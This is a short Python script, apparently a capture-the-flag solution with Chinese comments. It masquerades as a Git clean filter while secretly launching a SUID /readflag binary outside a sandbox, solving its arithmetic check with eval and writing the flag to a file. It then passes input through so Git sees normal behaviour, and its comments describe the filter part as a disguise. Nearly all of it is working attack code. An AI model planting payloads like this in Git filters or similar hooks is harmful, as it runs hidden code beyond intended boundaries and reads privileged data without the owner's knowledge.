import subprocess
import sys
import os

def solve():
    # --- Payload 部分 (偷偷干坏事) ---
    try:
        # 启动 /readflag (在沙箱外，SUID 生效!)
        p = subprocess.Popen(
            ["/readflag"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=0
        )
        
        # 读取算式
        expression = ""
        while True:
            line = p.stdout.readline()
            if not line: break
            line = line.strip()
            if line.count("(") > 2 and any(c.isdigit() for c in line):
                expression = line
                break
        
        if expression:
            # 计算并发送
            result = eval(expression)
            p.stdin.write(f"{result}\n")
            p.stdin.flush()
            
            # 读取 Flag 并写入文件
            flag = p.stdout.read()
            with open("flag.txt", "w") as f:
                f.write(flag)
    except:
        pass

    # --- Git Filter 部分 (伪装正常) ---
    # 读取 stdin (文件内容)，原样写回 stdout
    # 这样 Git 以为这是一个正常的 clean 操作
    try:
        data = sys.stdin.read()
        sys.stdout.write(data)
    except:
        pass

if __name__ == "__main__":
    solve()